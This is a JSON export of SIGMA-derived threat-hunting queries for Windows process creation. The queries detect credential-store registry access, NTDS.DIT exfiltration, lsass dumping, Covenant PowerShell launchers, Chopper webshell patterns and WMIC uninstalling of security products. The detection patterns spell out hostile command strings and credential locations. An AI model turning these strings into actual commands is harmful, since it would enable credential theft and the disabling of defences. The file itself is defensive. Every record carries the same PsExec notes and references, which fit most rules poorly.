            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\Software\\SimonTatham\\PuTTY\\Sessions\" or tgt.process.cmdline contains \"\\Software\\SimonTatham\\PuTTY\\SshHostKeys\\\" or tgt.process.cmdline contains \"\\Software\\Mobatek\\MobaXterm\\\" or tgt.process.cmdline contains \"\\Software\\WOW6432Node\\Radmin\\v3.0\\Server\\Parameters\\Radmin\" or tgt.process.cmdline contains \"\\Software\\Aerofox\\FoxmailPreview\" or tgt.process.cmdline contains \"\\Software\\Aerofox\\Foxmail\\V3.1\" or tgt.process.cmdline contains \"\\Software\\IncrediMail\\Identities\" or tgt.process.cmdline contains \"\\Software\\Qualcomm\\Eudora\\CommandLine\" or tgt.process.cmdline contains \"\\Software\\RimArts\\B2\\Settings\" or tgt.process.cmdline contains \"\\Software\\OpenVPN-GUI\\configs\" or tgt.process.cmdline contains \"\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\" or tgt.process.cmdline contains \"\\Software\\FTPWare\\COREFTP\\Sites\" or tgt.process.cmdline contains \"\\Software\\DownloadManager\\Passwords\" or tgt.process.cmdline contains \"\\Software\\OpenSSH\\Agent\\Keys\" or tgt.process.cmdline contains \"\\Software\\TightVNC\\Server\" or tgt.process.cmdline contains \"\\Software\\ORL\\WinVNC3\\Password\" or tgt.process.cmdline contains \"\\Software\\RealVNC\\WinVNC4\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 969
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Chromium Browser Headless Execution To Mockbin Like Site",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"--headless\" and (tgt.process.cmdline contains \"://run.mocky\" or tgt.process.cmdline contains \"://mockbin\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 970
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the Notepad++ updater (gup) to launch other commands or executables",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Arbitrary Binary Execution Using GUP Utility",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\gup.exe\" and tgt.process.image.path contains \"\\explorer.exe\") and (not ((tgt.process.image.path contains \"\\explorer.exe\" and tgt.process.cmdline contains \"\\Notepad++\\notepad++.exe\") or src.process.image.path contains \"\\Notepad++\\updater\\\" or not (tgt.process.cmdline matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 971
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects service path modification via the \"sc\" binary to a suspicious command or path",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "Suspicious Service Path Modification",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.cmdline contains \"config\" and tgt.process.cmdline contains \"binPath\") and (tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"cmd \" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"svchost\" or tgt.process.cmdline contains \"dllhost\" or tgt.process.cmdline contains \"cmd.exe /c\" or tgt.process.cmdline contains \"cmd.exe /k\" or tgt.process.cmdline contains \"cmd.exe /r\" or tgt.process.cmdline contains \"cmd /c\" or tgt.process.cmdline contains \"cmd /k\" or tgt.process.cmdline contains \"cmd /r\" or tgt.process.cmdline contains \"C:\\Users\\Public\" or tgt.process.cmdline contains \"\\Downloads\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" or tgt.process.cmdline contains \"C:\\Windows\\TEMP\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 972
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the initial execution of \"cmd.exe\" which spawns \"explorer.exe\" with the appropriate command line arguments for opening the \"My Computer\" folder.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1135"
            ],
            "name": "File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and tgt.process.image.path contains \"\\explorer.exe\" and tgt.process.cmdline contains \"shell:mycomputerfolder\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 973
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the powerShell New-MailboxExportRequest Cmdlet to exports a mailbox to a remote or local share, as used in ProxyShell exploitations",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious PowerShell Mailbox Export to Share",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"New-MailboxExportRequest\" and tgt.process.cmdline contains \" -Mailbox \" and tgt.process.cmdline contains \" -FilePath \\\\\")) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 974
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects python spawning a pretty tty",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Python Spawning Pretty TTY on Windows",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"python.exe\" or tgt.process.image.path contains \"python3.exe\" or tgt.process.image.path contains \"python2.exe\") and ((tgt.process.cmdline contains \"import pty\" and tgt.process.cmdline contains \".spawn(\") or tgt.process.cmdline contains \"from pty import spawn\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 975
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a process via the Windows task manager. This might be an attempt to bypass UAC",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "New Process Created Via Taskmgr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\taskmgr.exe\" and (not (tgt.process.image.path contains \":\\Windows\\System32\\mmc.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\resmon.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\Taskmgr.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 976
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1124"
            ],
            "name": "Discovery of a System Time",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\") and tgt.process.cmdline contains \"time\") or (tgt.process.image.path contains \"\\w32tm.exe\" and tgt.process.cmdline contains \"tz\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 977
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process patterns used in NTDS.DIT exfiltration",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Suspicious Process Patterns NTDS.DIT Exfil",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\NTDSDump.exe\" or tgt.process.image.path contains \"\\NTDSDumpEx.exe\") or (tgt.process.cmdline contains \"ntds.dit\" and tgt.process.cmdline contains \"system.hiv\") or tgt.process.cmdline contains \"NTDSgrab.ps1\") or (tgt.process.cmdline contains \"ac i ntds\" and tgt.process.cmdline contains \"create full\") or (tgt.process.cmdline contains \"/c copy \" and tgt.process.cmdline contains \"\\windows\\ntds\\ntds.dit\") or (tgt.process.cmdline contains \"activate instance ntds\" and tgt.process.cmdline contains \"create full\") or (tgt.process.cmdline contains \"powershell\" and tgt.process.cmdline contains \"ntds.dit\")) or (tgt.process.cmdline contains \"ntds.dit\" and ((src.process.image.path contains \"\\apache\" or src.process.image.path contains \"\\tomcat\" or src.process.image.path contains \"\\AppData\\\" or src.process.image.path contains \"\\Temp\\\" or src.process.image.path contains \"\\Public\\\" or src.process.image.path contains \"\\PerfLogs\\\") or (tgt.process.image.path contains \"\\apache\" or tgt.process.image.path contains \"\\tomcat\" or tgt.process.image.path contains \"\\AppData\\\" or tgt.process.image.path contains \"\\Temp\\\" or tgt.process.image.path contains \"\\Public\\\" or tgt.process.image.path contains \"\\PerfLogs\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 978
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious command lines used in Covenant luanchers",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1564"
            ],
            "name": "HackTool - Covenant PowerShell Launcher",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"-Sta\" and tgt.process.cmdline contains \"-Nop\" and tgt.process.cmdline contains \"-Window\" and tgt.process.cmdline contains \"Hidden\") and (tgt.process.cmdline contains \"-Command\" or tgt.process.cmdline contains \"-EncodedCommand\")) or (tgt.process.cmdline contains \"sv o (New-Object IO.MemorySteam);sv d \" or tgt.process.cmdline contains \"mshta file.hta\" or tgt.process.cmdline contains \"GruntHTTP\" or tgt.process.cmdline contains \"-EncodedCommand cwB2ACAAbwAgA\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 979
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uninstallation or termination of security products using the WMIC utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Potential Tampering With Security Products Via WMIC",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"wmic\" and tgt.process.cmdline contains \"product where \" and tgt.process.cmdline contains \"call\" and tgt.process.cmdline contains \"uninstall\" and tgt.process.cmdline contains \"/nointeractive\") or ((tgt.process.cmdline contains \"wmic\" and tgt.process.cmdline contains \"caption like \") and (tgt.process.cmdline contains \"call delete\" or tgt.process.cmdline contains \"call terminate\")) or (tgt.process.cmdline contains \"process \" and tgt.process.cmdline contains \"where \" and tgt.process.cmdline contains \"delete\")) and (tgt.process.cmdline contains \"%carbon%\" or tgt.process.cmdline contains \"%cylance%\" or tgt.process.cmdline contains \"%endpoint%\" or tgt.process.cmdline contains \"%eset%\" or tgt.process.cmdline contains \"%malware%\" or tgt.process.cmdline contains \"%Sophos%\" or tgt.process.cmdline contains \"%symantec%\" or tgt.process.cmdline contains \"Antivirus\" or tgt.process.cmdline contains \"AVG \" or tgt.process.cmdline contains \"Carbon Black\" or tgt.process.cmdline contains \"CarbonBlack\" or tgt.process.cmdline contains \"Cb Defense Sensor 64-bit\" or tgt.process.cmdline contains \"Crowdstrike Sensor\" or tgt.process.cmdline contains \"Cylance \" or tgt.process.cmdline contains \"Dell Threat Defense\" or tgt.process.cmdline contains \"DLP Endpoint\" or tgt.process.cmdline contains \"Endpoint Detection\" or tgt.process.cmdline contains \"Endpoint Protection\" or tgt.process.cmdline contains \"Endpoint Security\" or tgt.process.cmdline contains \"Endpoint Sensor\" or tgt.process.cmdline contains \"ESET File Security\" or tgt.process.cmdline contains \"LogRhythm System Monitor Service\" or tgt.process.cmdline contains \"Malwarebytes\" or tgt.process.cmdline contains \"McAfee Agent\" or tgt.process.cmdline contains \"Microsoft Security Client\" or tgt.process.cmdline contains \"Sophos Anti-Virus\" or tgt.process.cmdline contains \"Sophos AutoUpdate\" or tgt.process.cmdline contains \"Sophos Credential Store\" or tgt.process.cmdline contains \"Sophos Management Console\" or tgt.process.cmdline contains \"Sophos Management Database\" or tgt.process.cmdline contains \"Sophos Management Server\" or tgt.process.cmdline contains \"Sophos Remote Management System\" or tgt.process.cmdline contains \"Sophos Update Manager\" or tgt.process.cmdline contains \"Threat Protection\" or tgt.process.cmdline contains \"VirusScan\" or tgt.process.cmdline contains \"Webroot SecureAnywhere\" or tgt.process.cmdline contains \"Windows Defender\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 980
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious use of XORDump process memory dumping utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1003"
            ],
            "name": "HackTool - XORDump Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\xordump.exe\" or (tgt.process.cmdline contains \" -process lsass.exe \" or tgt.process.cmdline contains \" -m comsvcs \" or tgt.process.cmdline contains \" -m dbghelp \" or tgt.process.cmdline contains \" -m dbgcore \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 981
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects patterns found in process executions cause by China Chopper like tiny (ASPX) webshells",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505",
                "t1018",
                "t1033",
                "t1087"
            ],
            "name": "Chopper Webshell Process Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\w3wp.exe\" or src.process.image.path contains \"\\w3wp.exe\") and (tgt.process.cmdline contains \"&ipconfig&echo\" or tgt.process.cmdline contains \"&quser&echo\" or tgt.process.cmdline contains \"&whoami&echo\" or tgt.process.cmdline contains \"&c:&echo\" or tgt.process.cmdline contains \"&cd&echo\" or tgt.process.cmdline contains \"&dir&echo\" or tgt.process.cmdline contains \"&echo [E]\" or tgt.process.cmdline contains \"&echo [S]\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 982
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1569"
            ],
            "name": "PUA - RunXCmd Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" /account=system \" or tgt.process.cmdline contains \" /account=ti \") and tgt.process.cmdline contains \"/exec=\")) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 983
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects calls to \"SyncInvoke\" that is part of the \"CL_Invocation.ps1\" script to proxy execution using \"System.Diagnostics.Process\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
